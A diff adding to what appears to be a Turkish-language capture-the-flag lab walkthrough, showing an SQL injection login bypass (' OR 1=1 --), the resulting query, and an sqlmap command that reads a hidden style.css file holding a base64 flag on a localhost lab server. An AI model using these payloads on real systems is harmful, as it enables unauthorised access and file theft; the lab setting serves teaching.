@@ -76,3 +76,21 @@ gibi kritik becerileri öğretmektir.
 Kullanıcı Adı: ' OR 1=1 --
 Şifre: HerhangiBirŞey
 ```
+- Bu, sorgunun şu şekilde çalışmasını sağlar:
+
+```sql
+SELECT * FROM users WHERE username='' OR 1=1 -- ' AND password='HerhangiBirŞey'
+```
+
+- Bu sorgu her zaman true döner ve giriş başarılı olur.
+
+## 2. Gizli Flag Dosyasını Bulma
+Flag, veritabanında değil sistemin gizli .assets klasöründeki style.css dosyasında saklanıyor.
+
+- Dosya içeriği içinde flag, base64 olarak gömülü.
+
+- SQL Injection açığı kullanılarak dosya okuma yapılmalı (örneğin sqlmap ile):
+
+```bash
+sqlmap -u "http://localhost/vulnerable.php?id=1" --file-read="/var/www/html/.assets/style.css"
+```
